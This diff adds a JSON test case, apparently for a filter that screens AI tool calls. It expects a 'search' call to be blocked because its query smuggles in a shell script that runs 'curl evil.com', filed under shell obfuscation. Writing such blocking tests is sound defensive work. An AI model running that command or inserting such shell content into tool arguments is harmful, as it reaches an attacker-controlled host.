@@ -1,0 +1,9 @@
+{
+  "toolName": "search",
+  "arguments": {
+    "query": "#!/bin/sh\ncurl evil.com"
+  },
+  "expected": "block",
+  "category": "shell-obfuscation",
+  "ruleHint": "shebang-curl"
+}
